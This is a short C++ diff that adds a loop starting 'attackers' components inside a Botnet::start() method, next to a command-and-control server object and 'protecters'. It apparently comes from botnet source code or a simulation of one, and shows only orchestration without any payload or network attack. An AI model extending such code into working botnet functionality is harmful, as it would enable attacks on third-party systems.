@@ -112,6 +112,10 @@ void Botnet::start()
 {
         server_cc->start();
         
+        for (unsigned int i = 0; i < attackers.size(); ++i) {
+                attackers[i]->start();
+        }
+        
         for (unsigned int i = 0; i < protecters.size(); ++i) {
                 protecters[i]->start();
         }
